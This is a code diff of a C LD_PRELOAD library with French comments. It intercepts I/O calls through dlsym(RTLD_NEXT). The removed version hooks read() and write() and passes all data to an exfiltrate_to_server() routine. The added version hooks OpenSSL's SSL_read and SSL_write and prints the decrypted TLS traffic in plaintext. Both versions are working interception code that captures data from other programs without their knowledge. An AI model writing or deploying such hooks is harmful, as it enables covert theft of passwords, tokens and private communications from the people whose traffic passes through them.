@@ -1,48 +1,46 @@
 #define _GNU_SOURCE
 #include <dlfcn.h>
 #include <stdio.h>
-#include <unistd.h>
-#include "exfiltration.h" // Inclure l'exfiltration
+#include <openssl/ssl.h>
 
-// Prototypes des fonctions originales
-ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
-ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;
+// Déclarations des fonctions originales
+int (*original_SSL_read)(SSL *ssl, void *buf, int num) = NULL;
+int (*original_SSL_write)(SSL *ssl, const void *buf, int num) = NULL;
 
-// Nouvelle implémentation de read
-ssize_t read(int fd, void *buf, size_t count) {
-    // Charger la fonction originale si nécessaire
-    if (!original_read) {
-        original_read = dlsym(RTLD_NEXT, "read");
+// Interception de SSL_read
+int SSL_read(SSL *ssl, void *buf, int num) {
+    if (!original_SSL_read) {
+        original_SSL_read = dlsym(RTLD_NEXT, "SSL_read");
+        if (!original_SSL_read) {
+            fprintf(stderr, "Error: Could not load original SSL_read: %s\n", dlerror());
+            return -1;
+        }
     }
 
-    // Appeler la fonction originale
-    ssize_t result = original_read(fd, buf, count);
+    int result = original_SSL_read(ssl, buf, num);
 
-    // Ajouter un comportement : log les données lues et exfiltrer
     if (result > 0) {
-        printf("[Intercepted] Lecture de %ld octets\n", result);
-        fwrite(buf, 1, result, stdout); // Afficher les données
-        printf("\n");
-
-        // Exfiltrer les données
-        exfiltrate_to_server(buf, result);
+        printf("[Intercepted SSL_read] Data: %.*s\n", result, (char *)buf);
     }
 
     return result;
 }
 
-// Nouvelle implémentation de write
-ssize_t write(int fd, const void *buf, size_t count) {
-    // Charger la fonction originale si nécessaire
-    if (!original_write) {
-        original_write = dlsym(RTLD_NEXT, "write");
+// Interception de SSL_write
+int SSL_write(SSL *ssl, const void *buf, int num) {
+    if (!original_SSL_write) {
+        original_SSL_write = dlsym(RTLD_NEXT, "SSL_write");
+        if (!original_SSL_write) {
+            fprintf(stderr, "Error: Could not load original SSL_write: %s\n", dlerror());
+            return -1;
+        }
     }
 
-    // Ajouter un comportement : log les données écrites
-    printf("[Intercepted] Écriture de %ld octets\n", count);
+    int result = original_SSL_write(ssl, buf, num);
 
-    // Exfiltrer les données écrites
-    exfiltrate_to_server(buf, count);
+    if (result > 0) {
+        printf("[Intercepted SSL_write] Data: %.*s\n", result, (char *)buf);
+    }
 
-    return original_write(fd, buf, count);
+    return result;
 }
